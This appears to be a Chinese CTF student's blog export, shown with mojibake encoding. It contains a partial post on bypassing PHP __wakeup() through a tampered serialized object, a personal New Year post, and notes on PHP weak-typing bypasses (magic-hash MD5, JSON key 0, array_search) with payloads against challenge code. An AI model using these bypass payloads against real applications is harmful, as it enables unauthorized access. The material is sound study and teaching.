<p>æ­¤æ—¶å¯ä»¥ç†è§£<strong>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</strong>æ˜¯å°†å¤æ‚çš„æ•°æ®ç±»å‹å‹ç¼©æˆä¸€ä¸ªå­—ç¬¦ä¸² </p>
<blockquote>
<p><strong>serialize()</strong> æŠŠå˜é‡å’Œå®ƒä»¬çš„å€¼ç¼–ç æˆæ–‡æœ¬å½¢å¼<br><strong>unserialize()</strong> æ¢å¤åŸå…ˆå˜é‡  </p>
</blockquote>
<hr>
<h2 id="ç»•è¿‡-wakeup"><a href="#ç»•è¿‡-wakeup" class="headerlink" title="ç»•è¿‡ __wakeup()"></a>ç»•è¿‡ __wakeup()</h2><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">å‚è€ƒæ–‡æ¡£</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $flag = <span class="string">'123'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure></div>

<p>å¯¹äºè¯¥é¢˜ï¼Œå…ˆå¯ä»¥çœ‹åˆ° <code>ç±»test</code> ä¸­æœ‰ <code>flagå˜é‡</code>ï¼Œå¹¶è°ƒç”¨äº†<code>__wakeup()</code>ï¼Œåˆ™è€ƒè™‘å®ä¾‹åŒ–<code>testç±»</code> å¹¶å°†å…¶å˜é‡åºåˆ—åŒ–ã€‚å¹¶çŒœæµ‹æ„å›¾ä¸ºå°†åºåˆ—åŒ–ç»“æœè¾“å…¥åœ¨ <code>?code=</code> åè¿›è¡ŒPOSTè¯·æ±‚ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'123'</span>;</span><br><span class="line">pubilc <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// åºåˆ—åŒ–è¾“å‡ºç»“æœä¸ºï¼š</span></span><br><span class="line"><span class="comment">// O:4:"test":1:&#123;s:4:"flag";s:3:"123";&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>æ­£å¸¸ç»“æœè¾“å…¥æ—¶ï¼Œä¼šæ‰§è¡Œ<strong>wakeup()ï¼Œä»è€Œè¾“å‡ºâ€™bad requestsâ€™ï¼Œå¹¶é€€å‡ºè„šæœ¬ï¼Œå› æ­¤åˆ©ç”¨æ¼æ´ç»•è¿‡</strong>wakeup()ã€‚</p>
<p>å°†åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­<font color="red">ä»£è¡¨å˜é‡ä¸ªæ•°çš„æ•°å­—</font>æ”¹ä¸ºå¤§äºå…¶çœŸå®å€¼çš„æ•°å­—ï¼Œå¹¶è¿›è¡ŒPOSTè¯·æ±‚ï¼Œå¾—åˆ°flagã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"123"</span>;&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½ çœ‹ä»–èº«ä¸Šæ’æ»¡çš„flagåƒä¸åƒä¸ªå”±æˆçš„è€å°†å†›</title>
    <url>/yakko117/2019/02/04/%E4%BD%A0%E7%9C%8B%E4%BB%96%E8%BA%AB%E4%B8%8A%E6%8F%92%E6%BB%A1%E7%9A%84flag%E5%83%8F%E4%B8%8D%E5%83%8F%E4%B8%AA%E5%94%B1%E6%88%8F%E7%9A%84%E8%80%81%E5%B0%86%E5%86%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="18å¹´çš„ç‹—ç ¸"><a href="#18å¹´çš„ç‹—ç ¸" class="headerlink" title="18å¹´çš„ç‹—ç ¸"></a>18å¹´çš„ç‹—ç ¸</h1><p>æ‰“ç®—è½¬ç½‘å®‰è¿˜æ˜¯æš‘å‡çš„æ—¶å€™ï¼Œå¿™ç¢Œçš„å¤§ä¸€æ—¶å…‰çœ¨çœ¼å°±è¿‡å»ï¼Œè‡ªå·±å¤„äºä¸€ç§è¿·èŒ«ä¸”ä¸çŸ¥é“å¦‚ä½•å‰è¿›çš„çŠ¶æ€ï¼Œåœ¨æ— æ•°ä¸ªåå­—è·¯å£å‰ä¸¾æ­¥ä¸å‰æ—¶ï¼Œæ„Ÿè°¢æˆ‘å§ï¼Œé™ªæˆ‘èŠäº†è®¸å¤šï¼Œä¹Ÿè®©æˆ‘æœ‰äº†ä¸€ä¸ªæ–°çš„ç›®æ ‡å’Œæ–¹å‘ï¼Œè®©æˆ‘ä»å’¸é±¼ç‹å˜æˆäº†å¦ä¸€ä¸ªæ–¹å‘çš„å’¸é±¼&gt;w&lt;ï¼›è¿™ä¸€å¹´æˆ‘å¾ˆå¹¸è¿é‡åˆ°äº†å¾ˆå¤šå¾ˆå¤šå¾ˆå¤šå¾ˆå¤šå¸®åŠ©è¿‡æˆ‘çš„äººï¼Œæ— è®ºæ˜¯æ›¾ç»çš„æ–°åª’ä½“çš„æœ‹å‹ï¼Œæˆ–æ˜¯ç½‘ç»œä¸­å¿ƒçš„è€å¸ˆã€å­¦é•¿è¿˜æ˜¯é‚£ç¾¤åš·åš·ç€è¦â€œæŠ•æ¹–â€çš„åŸºå‹ï¼ŒçœŸçš„å¾ˆæ„Ÿè°¢ä½ ä»¬å¯¹æˆ‘çš„åŒ…å®¹å’Œç…§é¡¾,ä½¿æˆ‘ä»åˆå…¥å¤§å­¦ä¸€è„¸æ‡µçš„èŒæ–°ï¼Œå˜æˆèƒ½åœ¨ç¾¤é‡Œçœ‹dalaoæ“ä½œçš„æ­»å’¸é±¼ã€‚ï¼ˆé›¾</p>
<hr>
<blockquote>
<p>è¦æƒ³çœŸæ­£è¿›å…¥ä¸€ä¸ªåœˆå­ï¼Œé¦–å…ˆè‡ªå·±è¦æˆä¸ºé‚£æ ·çš„äººã€‚ è¦æƒ³è¿‡å¥½è¿™ä¸€ç”Ÿï¼Œè‡ªå·±å°±è¦åŠªåŠ›æˆä¸ºä¸€ä¸ªå‰å®³çš„äººã€‚ äººè„‰ä¸æ˜¯ä½ è®¤è¯†å¤šå°‘äººè€Œæ˜¯æœ‰å¤šå°‘äººæƒ³è®¤è¯†ä½ ã€‚ä¸æ‰§å¿µäºè™šåï¼Œä¸è¿·æ‹äºäººè„‰ï¼Œä¸ç€æ€¥äºä¸€æ­¥ç™»å¤©ï¼Œè¸è¸å®å®è€•è€˜è‡ªå·±çš„äººç”Ÿã€‚<br><strong>æ¯•ç«Ÿï¼Œè¿™æ˜¯ä¸€ä¸ªä¿¡ä»°å®åŠ›çš„æ—¶ä»£</strong>ï¼</p>
</blockquote>
<h2 id="flagæœ€å¤šçš„ä¸€å¹´"><a href="#flagæœ€å¤šçš„ä¸€å¹´" class="headerlink" title="flagæœ€å¤šçš„ä¸€å¹´"></a>flagæœ€å¤šçš„ä¸€å¹´</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0oo5lblyhj31400u078z.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0oo5lblyhj31400u078z.jpg" class="lazyload" title="test"></a></p>
<hr>
<p><strong>â€œæˆ‘ä¸€å®šè¦æŠŠåšå®¢æ­å¥½ï¼â€</strong>è¿™å¥å–Šäº†ä¸€å¹´çš„è¯ï¼Œç»ˆäºåœ¨å¯’å‡å®ç°äº†ï¼Œä»åæœˆç¬¬ä¸€æ¬¡å¬è¯´ctfï¼Œåˆ°ç°åœ¨æ…¢æ…¢å¼€å§‹è®°å½•<code>write up</code>ï¼ˆè™½ç„¶è¿˜æ²¡æœ‰æ”¾ä¸Šæ¥233ï¼‰ã€å¼€å§‹ä»¥é¾Ÿé€Ÿåˆ’æ°´å‰è¡Œï¼Œ<strong>æˆé•¿</strong>è¿™æ¡é“è·¯,æˆ‘æ‰åˆšåˆšå¼€å§‹ä¸Šè·¯ã€‚</p>
<p>ä»Šå¹´é™†é™†ç»­ç»­æ‰“äº†å‡ åœºæ¯”èµ›ï¼Œä¹Ÿèººäº†ä¸ªå¥–ï¼ˆè‡ªå·±æ˜¯çœŸçš„èœï¼‰ï¼ŒåŸºæœ¬ä¸Šåœ¨æ¯”èµ›æ—¶è‡ªå·±å°±æ˜¯ä¸€è„¸æ‡µçš„çœ‹ç€é¢˜ç›®å’Œæ„Ÿæ…¨å¤§ä½¬ç¥ä¹å…¶ç¥çš„æ“ä½œï¼Œä½†ä¹Ÿå› æ­¤è®¤è¯†äº†å„åœ°çš„å¸ˆå‚…ï¼Œä¹Ÿæ¿€å‘èµ·è‡ªå·±å­¦ä¹ çš„åŠ¨åŠ›ï¼Œæ˜ç¡®äº†ç›®æ ‡ã€‚è®°å¾—å‰å‡ å¤©è¿˜è¯´ï¼Œè¦åœ¨è¿‡å¹´å‰è®°å½•phpåºåˆ—åŒ–çš„å­¦ä¹ è¿‡ç¨‹ï¼Œåœ¨ç½‘ä¸Šçœ‹äº†è®¸å¤šdalaoçš„åšå®¢æ€»ç»“åï¼Œç»“æœåˆ°ä»Šå¤©ï¼Œè‡ªå·±æ‰<strong>å¯è€»</strong>çš„å†™ä¸‹äº†ä¸€ä¸ªtitle<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0oo5lan0rj30u0139gqf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g0oo5lan0rj30u0139gqf.jpg" class="lazyload" title="test"></a> width=â€20%â€ height=â€20%â€&gt;<br>å°½é‡è¿‡å‡ å¤©èµ¶å‡ºæ¥å§ï¼Œå¤§å¹´åˆä¸€ã€åˆäºŒè¦å‡ºå»æ‹œå¹´ï¼Œäº‰å–åœ¨åˆå…­å’Œæœ‹å‹ä»¬å‡ºå»ç©ä¹‹å‰å†™ä¸€éƒ¨åˆ†å§ã€‚</p>
<hr>
<h2 id="19å¹´çš„flag"><a href="#19å¹´çš„flag" class="headerlink" title="19å¹´çš„flag"></a>19å¹´çš„flag</h2><ul>
<li>åšæŒå­¦ä¹ ï¼ŒåšæŒæŠŠå­¦ä¹ æˆæœè®°å½•æ€»ç»“</li>
<li>å¤šå†™ä»£ç ï¼Œè‡ªå·±å­¦ä¼šå†™æ¼æ´ç¯å¢ƒï¼Œå­¦ä¹ ä»£ç å®¡è®¡</li>
<li>é™¤äº†webæ–¹å‘ï¼Œå¼€å§‹å­¦ä¹ RE</li>
<li>æ³¨æ„èº«ä½“ï¼Œå°‘ç†¬å¤œ</li>
<li>åŠªåŠ›å‘XCTFå‘èµ·æŒ‘æˆ˜</li>
</ul>
<hr>
<p>å¥½äº†ï¼Œå°±è¿™æ ·å§ï¼Œé…å®¶é‡Œäººçœ‹æ˜¥æ™šå»äº†</p>
]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP code audit</title>
    <url>/yakko117/2019/01/22/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="PHPå¼±ç±»å‹æ€»ç»“"><a href="#PHPå¼±ç±»å‹æ€»ç»“" class="headerlink" title="PHPå¼±ç±»å‹æ€»ç»“"></a>PHPå¼±ç±»å‹æ€»ç»“</h1><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è‡ªå·±æ˜¯ä¸ªctfèŒæ–°ï¼Œå¯¹äºcode auditå®Œå…¨æ˜¯ä¸€è„¸æ‡µçš„æƒ…å†µï¼›æœ€è¿‘çš„ctfæ¯”èµ›ï¼ŒåŸºæœ¬ä¸Šæ¯æ¬¡éƒ½æœ‰phpä»£ç å®¡è®¡é¢˜ã€‚ ç„¶åè¿™é‡Œå¼€ä¸ªå‘ï¼Œä»é›¶å¼€å§‹ç§¯ç´¯<strong>phpä»£ç å®¡è®¡</strong></p>
<a id="more"></a>
<p>(ps:å‚è€ƒäº†æ— æ•°å¤§ä½¬çš„æ–‡ç«  åšäº†ä¸ªå½’çº³æ€»ç»“ï¼Œä»¥åä¹Ÿä¼šä¸æ–­æŠŠè‡ªå·±çš„ç§¯ç´¯è®°å½•ä¸‹æ¥çš„)</p>
<hr>
<h2 id="çŸ¥è¯†ä»‹ç»"><a href="#çŸ¥è¯†ä»‹ç»" class="headerlink" title="çŸ¥è¯†ä»‹ç»"></a>çŸ¥è¯†ä»‹ç»</h2><p>phpä¸­æœ‰ä¸¤ç§æ¯”è¾ƒçš„ç¬¦å· <strong>==</strong> ä¸ <strong>===</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $a = $b ;</span><br><span class="line"> $a===$b ;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><strong>===</strong> åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ<br><strong>==</strong> åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ</p>
<pre><code>å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²
åˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ</code></pre><p>è¿™é‡Œæ˜ç¡®äº†è¯´å¦‚æœä¸€ä¸ªæ•°å€¼å’Œå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å€¼</p>
<hr>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"admin"</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>); <span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">//ä¸Šè¿°ä»£ç å¯è‡ªè¡Œæµ‹è¯•</span></span><br></pre></td></tr></table></figure></div>
<p><code>&quot;admin&quot;==0</code>æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†adminè½¬åŒ–æˆæ•°å€¼ï¼Œå¼ºåˆ¶è½¬åŒ–,ç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬åŒ–çš„ç»“æœæ˜¯0è‡ªç„¶å’Œ0ç›¸ç­‰<br> <code>&quot;1admin&quot;==1</code>æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†1adminè½¬åŒ–æˆæ•°å€¼,ç»“æœä¸º1ï¼Œè€Œ<code>&quot;admin1&quot;==1</code> å´ç­‰äºé”™è¯¯ï¼Œä¹Ÿå°±æ˜¯â€admin1â€è¢«è½¬åŒ–æˆäº†0<br><code>&quot;0e123456&quot;==&quot;0e456789&quot;</code>ç›¸äº’æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œ0çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶ï¼Œæ‰€ä»¥ç›¸ç­‰</p>
<p>å¯¹äºä¸Šè¿°çš„é—®é¢˜æˆ‘æŸ¥äº†phpæ‰‹å†Œ</p>
<blockquote>
<p>å½“ä¸€ä¸ªå­—ç¬¦ä¸²æ¬¸å½“ä½œä¸€ä¸ªæ•°å€¼æ¥å–å€¼ï¼Œå…¶ç»“æœå’Œç±»å‹å¦‚ä¸‹:å¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«<code>. e E</code> å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…,è¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œ<strong>è¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</strong></p>
</blockquote>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = <span class="number">1</span> + <span class="string">"10.5"</span>;  <span class="comment">// $test=11.5(float)</span></span><br><span class="line">$test = <span class="number">1</span> + <span class="string">"-1.3e3"</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line">$test = <span class="number">1</span> + <span class="string">"bob-1.3e3"</span>;  <span class="comment">//$test=1(int)</span></span><br><span class="line">$test = <span class="number">1</span> + <span class="string">"2admin"</span>;  <span class="comment">//$test=3(int)</span></span><br><span class="line">$test = <span class="number">1</span> + <span class="string">"admin2"</span>;  <span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥å°±è§£é‡Šäº†<code>&quot;admin1&quot;==1 =&gt;False</code> çš„åŸå› </p>
<hr>
<h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><h3 id="MD5-ç»•è¿‡"><a href="#MD5-ç»•è¿‡" class="headerlink" title="MD5 ç»•è¿‡"></a>MD5 ç»•è¿‡</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $logined = <span class="keyword">true</span>;</span><br><span class="line">    $Username = $_GET[<span class="string">'Username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!ctype_alpha($Username)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (md5($Username) != md5($password)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"login failed!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>é¢˜ç›®å¤§æ„æ˜¯è¦è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å’Œæ•°å­—ç±»å‹ï¼Œå¹¶ä¸”ä»–ä»¬çš„md5å€¼ç›¸ç­‰ï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œä¸‹ä¸€æ­¥è¯­å¥,<strong>0eåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥æ— è®º0eåé¢æ˜¯ä»€ä¹ˆï¼Œ0çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯0ã€‚md5(â€˜240610708â€™) == md5(â€˜QNKCDZOâ€™)</strong> æˆåŠŸç»•è¿‡!</p>
<p>å—é‚®è¿™é‡Œæœ‰ä¸€é“å·®ä¸å¤šçš„ [å—é‚®ctfä¾‹é¢˜](<a href="http://ctf.nuptzj.cn/challenges#md5" target="_blank" rel="noopener">http://ctf.nuptzj.cn/challenges#md5</a> collision)</p>
<hr>
<h3 id="json-ç»•è¿‡"><a href="#json-ç»•è¿‡" class="headerlink" title="json ç»•è¿‡"></a>json ç»•è¿‡</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¾“å…¥ä¸€ä¸ªjsonç±»å‹çš„å­—ç¬¦ä¸²ï¼Œ<code>json_decode</code>å‡½æ•°è§£å¯†æˆä¸€ä¸ªæ•°ç»„ï¼Œåˆ¤æ–­æ•°ç»„ä¸­keyçš„å€¼æ˜¯å¦ç­‰äº <code>$key</code> çš„å€¼ï¼Œä½†æ˜¯ <code>$key</code> çš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ <code>0==&quot;admin&quot;</code> è¿™ç§å½¢å¼ç»•è¿‡<br>æœ€ç»ˆ <strong><code>payload message={&quot;key&quot;:0}</code></strong></p>
<hr>
<h3 id="array-search-ä¸-is-array-ç»•è¿‡"><a href="#array-search-ä¸-is-array-ç»•è¿‡" class="headerlink" title="array_search ä¸ is_array ç»•è¿‡"></a><strong>array_search ä¸ is_array</strong> ç»•è¿‡</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!is_array($_GET[<span class="string">'test'</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line">$test=$_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($test);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($test[$i]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i]=intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">"admin"</span>,$test)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å…ˆåˆ¤æ–­ä¼ å…¥çš„æ˜¯ä¸æ˜¯æ•°ç»„ï¼Œç„¶åå¾ªç¯éå†æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼<br>å¹¶ä¸”æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¸èƒ½å’Œ<code>admin</code>ç›¸ç­‰ï¼Œå¹¶ä¸”å°†æ¯ä¸ªå€¼è½¬åŒ–ä¸º<code>intç±»å‹</code><br>å†åˆ¤æ–­ä¼ å…¥çš„æ•°ç»„æ˜¯å¦æœ‰<code>admin</code>ï¼Œæœ‰åˆ™è¿”å›flag</p>
<p><code>payload test[]=0</code>å¯ä»¥ç»•è¿‡</p>
<p>ä¸‹é¢æ˜¯å®˜æ–¹æ‰‹å†Œå¯¹array_searchçš„ä»‹ç»</p>
<pre><code>mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )</code></pre><p><code>$needle</code>ï¼Œ<code>$haystack</code>å¿…éœ€ï¼Œ<code>$strict</code>å¯é€‰ <br> å‡½æ•°åˆ¤æ–­<code>$haystack</code>ä¸­çš„å€¼æ˜¯å­˜åœ¨<code>$needle</code>ï¼Œå­˜åœ¨åˆ™è¿”å›è¯¥å€¼çš„é”®å€¼<br> ç¬¬ä¸‰ä¸ªå‚æ•°é»˜è®¤ä¸º<code>false</code>ï¼Œå¦‚æœè®¾ç½®ä¸º<code>true</code>åˆ™ä¼šè¿›è¡Œä¸¥æ ¼è¿‡æ»¤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">var_dump(array_search(<span class="string">"admin"</span>,$a)); <span class="comment">// int(0) =&gt; è¿”å›é”®å€¼0</span></span><br><span class="line">var_dump(array_seach(<span class="string">"1admin"</span>,$a));  <span class="comment">// int(1) ==&gt;è¿”å›é”®å€¼1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><strong>array_search</strong>å‡½æ•°,ç±»ä¼¼äº <strong>==</strong> ä¹Ÿå°±æ˜¯ <code>$a==&quot;admin&quot;</code> å½“ç„¶æ˜¯<code>$a=0</code>  å½“ç„¶å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°ä¸º<code>true</code>åˆ™å°±ä¸èƒ½ç»•è¿‡</p>
<hr>
